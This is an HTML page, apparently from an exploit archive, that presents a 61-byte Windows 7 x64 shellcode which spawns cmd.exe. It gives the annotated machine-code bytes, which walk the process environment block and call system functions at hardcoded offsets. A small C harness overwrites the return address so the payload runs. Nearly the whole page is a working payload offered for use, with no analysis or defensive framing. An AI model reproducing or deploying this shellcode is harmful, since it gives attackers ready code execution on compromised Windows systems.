<html><head><title>Windows-64 - Windows Seven x64 (cmd) - 61 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
 /*
 | Title: Windows Seven x64 (cmd) Shellcode 61 Bytes
 | Type: Shellcode
 | Author: agix
 | Platform: win32
 | Info: Tested on Windows Seven Pro Fr, Ultimate En, Premium Home En
*/

#include &lt;stdio.h&gt;

char shellcode[] =

&quot;\x31\xC9&quot;                   //xor ecx,ecx
&quot;\x64\x8B\x71\x30&quot;           //mov esi,[fs:ecx+0x30]
&quot;\x8B\x76\x0C&quot;               //mov esi,[esi+0xc]
&quot;\x8B\x76\x1C&quot;               //mov esi,[esi+0x1c]
&quot;\x8B\x36&quot;                   //mov esi,[esi]
&quot;\x8B\x06&quot;                   //mov eax,[esi]
&quot;\x8B\x68\x08&quot;               //mov ebp,[eax+0x8]
&quot;\xEB\x20&quot;                   //jmp short 0x35
&quot;\x5B&quot;                       //pop ebx
&quot;\x53&quot;                       //push ebx
&quot;\x55&quot;                       //push ebp
&quot;\x5B&quot;                       //pop ebx
&quot;\x81\xEB\x11\x11\x11\x11&quot;   //sub ebx,0x11111111
&quot;\x81\xC3\xDA\x3F\x1A\x11&quot;   //add ebx,0x111a3fda (for seven X86 add ebx,0x1119f7a6)
&quot;\xFF\xD3&quot;                   //call ebx
&quot;\x81\xC3\x11\x11\x11\x11&quot;   //add ebx,0x11111111
&quot;\x81\xEB\x8C\xCC\x18\x11&quot;   //sub ebx,0x1118cc8c (for seven X86 sub ebx,0x1114ccd7)
&quot;\xFF\xD3&quot;                   //call ebx
&quot;\xE8\xDB\xFF\xFF\xFF&quot;       //call dword 0x15
//db &quot;cmd&quot;
&quot;\x63\x6d\x64&quot;;


int main(int argc, char **argv) {
        int *ret;
        ret = (int *)&amp;ret + 2;
        (*ret) = (int) shellcode;
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
